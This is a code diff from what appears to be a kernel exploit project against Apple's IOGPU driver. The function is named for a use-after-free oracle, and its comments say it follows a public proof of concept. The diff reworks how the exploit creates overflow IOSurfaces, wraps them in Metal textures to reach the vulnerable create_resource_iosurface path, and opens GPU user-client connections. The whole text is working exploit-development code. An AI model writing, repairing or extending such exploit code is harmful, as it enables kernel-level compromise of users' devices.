@@ -40,28 +40,23 @@
 
 // Metal is linked in build.sh, but the SDK's Metal umbrella does not expose
 // its types to this translation unit (measured on the CI toolchain: MTLDevice
-// undeclared despite -framework Metal).  Hand-declare the minimal surface we
-// need - the signatures match the runtime (note the lowercase "iosurface:",
-// exactly as the CI compiler suggested), and Metal.framework provides the
-// implementations at link time.
-@protocol MTLTexture
-@end
+// undeclared despite -framework Metal, and a hand-declared @protocol did not
+// satisfy the compiler either).  So: plain id + the REAL selector names
+// declared on NSObject (a category), and the class fetched at runtime.  The
+// signatures match the runtime (note the lowercase "iosurface:", exactly as
+// the CI compiler suggested).
+extern id MTLCreateSystemDefaultDevice(void);
 
-@interface MTLTextureDescriptor : NSObject
+@interface NSObject (RSMetalNames)
 + (instancetype)texture2DDescriptorWithPixelFormat:(NSUInteger)pixelFormat
                                             width:(NSUInteger)width
                                            height:(NSUInteger)height
                                         mipmapped:(BOOL)mipmapped;
-@property (nonatomic) NSUInteger usage;
+- (id)newTextureWithDescriptor:(id)descriptor
+                     iosurface:(struct __IOSurface *)iosurface
+                         plane:(NSUInteger)plane;
+- (void)setUsage:(NSUInteger)usage;
 @end
-
-@protocol MTLDevice <NSObject>
-- (id<MTLTexture>)newTextureWithDescriptor:(MTLTextureDescriptor *)descriptor
-                                iosurface:(struct __IOSurface *)iosurface
-                                    plane:(NSUInteger)plane;
-@end
-
-extern id<MTLDevice> MTLCreateSystemDefaultDevice(void);
 
 #define RS_MTL_PIXEL_BGRA8UNORM 80
 #define RS_MTL_USAGE_SHADERREAD 1
@@ -129,15 +124,15 @@ NSString *ModIOGPUUAFOracle(void) {
             // The trigger: a Metal texture over the overflow surface is how the
             // public PoC reaches IOGPUDevice::create_resource_iosurface.
             @try {
-                id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+                id dev = MTLCreateSystemDefaultDevice();
                 if (dev) {
-                    MTLTextureDescriptor *td = [MTLTextureDescriptor
-                        texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
-                        width:O[i].w height:O[i].h mipmapped:NO];
-                    td.usage = RS_MTL_USAGE_SHADERREAD;
-                    id<MTLTexture> tex = [dev newTextureWithDescriptor:td
-                                                            iosurface:(struct __IOSurface *)s
-                                                                plane:0];
+                    Class tdCls = objc_getClass("MTLTextureDescriptor");
+                    id td = [tdCls texture2DDescriptorWithPixelFormat:RS_MTL_PIXEL_BGRA8UNORM
+                                                               width:O[i].w height:O[i].h mipmapped:NO];
+                    [td setUsage:RS_MTL_USAGE_SHADERREAD];
+                    id tex = [dev newTextureWithDescriptor:td
+                                                 iosurface:(struct __IOSurface *)s
+                                                     plane:0];
                     AveLog(S(@"    texture %-24s -> %s", O[i].tag, tex ? "created" : "nil"));
                 } else {
                     AveLog(S(@"    texture %-24s -> no MTLDevice", O[i].tag));
@@ -150,34 +145,25 @@ NSString *ModIOGPUUAFOracle(void) {
     }
     AveLog(S(@"[gpu64788] %d/4 overflow surfaces created", made));
 
-    // ---- (2b) find the GPU connection in OUR task (the PoC's method: the
-    // accelerator connection is created by the GPU daemon, not by us, so
-    // enumerate the task's send rights and probe each) ----
+    // ---- (2b) AFTER the textures exist, retry the GPU classes with every
+    // connection type (the GPU daemon sets up the accelerators on first use) ----
     if (!gpu) {
-        mach_port_name_array_t ports = NULL;
-        mach_port_type_array_t types = NULL;
-        mach_port_mscount_t pn = 0;
-        if (mach_ports_lookup(mach_task_self(), &ports, &types, &pn) == KERN_SUCCESS && pn) {
-            AveLog(S(@"[gpu64788] task has %u mach ports - probing send rights", pn));
-            int answered = 0;
-            for (mach_port_mscount_t i = 0; i < pn; i++) {
-                if (!(types[i] & MACH_PORT_TYPE_SEND)) continue;
-                uint64_t in[4] = {1, 0, 0, 0};
-                uint64_t out[4] = {0, 0, 0, 0};
-                size_t outSz = sizeof(out);
-                kern_return_t r = IOConnectCallMethod(ports[i], 0, in, 4, NULL, 0,
-                                                      out, &outSz, NULL, NULL);
-                // a connection that does not answer with "not a connection"
-                if (r != (kern_return_t)0xe00002c2 && r != KERN_SUCCESS &&
-                    r != (kern_return_t)0xe00002bd) {
-                    AveLog(S(@"    port %#x sel 0 -> %#x", ports[i], r));
-                    answered++;
-                    if (!gpu && r != (kern_return_t)0x10000003) gpu = ports[i];
+        for (int i = 0; cls[i]; i++) {
+            for (uint32_t t = 0; t < 4; t++) {
+                CFMutableDictionaryRef m = IOServiceMatching(cls[i]);
+                if (!m) continue;
+                io_service_t d = IOServiceGetMatchingService(kIOMainPortDefault, m);
+                if (!d) continue;
+                io_connect_t c = 0;
+                kern_return_t kr = IOServiceOpen(d, mach_task_self(), t, &c);
+                IOObjectRelease(d);
+                if (kr == KERN_SUCCESS && c) {
+                    AveLog(S(@"    class %-18s type %u -> OPEN", cls[i], t));
+                    gpu = c; who = cls[i];
+                    break;
                 }
             }
-            AveLog(S(@"[gpu64788] %d/%u ports answered a probe", answered, pn));
-            vm_deallocate(mach_task_self(), (vm_address_t)ports, 4 * pn);
-            vm_deallocate(mach_task_self(), (vm_address_t)types, 4 * pn);
+            if (gpu) break;
         }
     }
 
